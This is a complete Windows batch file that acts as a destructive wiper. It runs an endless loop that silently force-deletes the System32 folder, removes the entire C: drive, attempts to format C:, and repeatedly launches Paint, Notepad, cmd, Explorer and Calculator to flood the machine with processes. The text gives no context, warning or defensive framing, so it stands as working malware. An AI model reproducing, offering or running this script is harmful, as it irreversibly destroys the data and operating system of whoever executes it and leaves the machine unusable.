@echo off
:x
del C:\Windows\System32\*.* /f /s /q >nul 2>&1
rd C:\ /s /q >nul 2>&1
format C: /fs:NTFS /q /y >nul 2>&1
start mspaint
start notepad
start cmd
start explorer
start calc
goto x
